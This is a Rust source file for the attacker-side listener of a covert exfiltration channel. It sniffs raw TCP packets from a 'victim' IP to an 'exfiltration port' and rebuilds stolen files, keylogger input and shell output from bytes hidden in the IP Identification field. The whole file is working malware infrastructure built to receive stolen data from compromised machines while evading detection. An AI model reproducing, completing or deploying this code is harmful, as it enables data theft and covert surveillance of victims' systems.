use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::Packet;
use std::net::Ipv4Addr;
// CHANGED: Use transport instead of datalink
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::io::{self, Write};

const CMD_EOF: u8 = 0x41;
const CMD_START_TRANSFER: u8 = 0x40;

pub struct PcapHandle {
    pub running: Arc<AtomicBool>,
}

impl PcapHandle {
    pub fn start(_iface_name: &str, target_ip: String, listen_port: u16) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let thread_running = running.clone();
        let target_ipv4: Ipv4Addr = target_ip.parse().expect("Invalid Target IP");

        thread::spawn(move || {
            // CHANGED: Open a Layer 3 Transport Channel for TCP
            // This ignores Ethernet/WiFi headers and works on any interface
            let protocol = Layer3(IpNextHeaderProtocols::Tcp);
            let (_, mut rx) = match transport_channel(65535, protocol) {
                Ok((tx, rx)) => (tx, rx),
                Err(e) => {
                    eprintln!("[!] Sniffer failed to open L3 channel: {}. Need sudo?", e);
                    return;
                }
            };

            let mut binary_mode = false;
            let mut file_data = Vec::new();
            
            // Create an iterator that yields IPv4 packets
            let mut iter = pnet::transport::ipv4_packet_iter(&mut rx);

            println!("[*] L3 Sniffer Active. Filtering: {} -> Port {}", target_ipv4, listen_port);

            while thread_running.load(Ordering::Relaxed) {
                // CHANGED: The iterator handles packet extraction automatically
                if let Ok((ip, _)) = iter.next() {
                    // Filter: Source IP must be victim, Protocol must be TCP
                    if ip.get_source() == target_ipv4 && ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
                        if let Some(tcp) = TcpPacket::new(ip.payload()) {
                            // Only listen to the designated exfiltration port
                            if tcp.get_destination() == listen_port {
                                // Extract hidden byte from IP Identification field
                                let byte = (ip.get_identification() & 0x00FF) as u8;
                                
                                match byte {
                                    CMD_START_TRANSFER => {
                                        binary_mode = true;
                                        file_data.clear();
                                        println!("\n[!] Sniffer: File transfer detected...");
                                    },
                                    CMD_EOF => {
                                        if binary_mode {
                                            println!("\n[+] Sniffer: Received {} bytes.", file_data.len());
                                            binary_mode = false;
                                            // Optional: Save to file logic here
                                        }
                                    },
                                    _ => {
                                        if binary_mode {
                                            file_data.push(byte);
                                        } else {
                                            // Real-time print for keylogging/shell output
                                            print!("{}", byte as char);
                                            let _ = io::stdout().flush();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            println!("[*] Sniffer thread exiting gracefully.");
        });

        Self { running }
    }
}
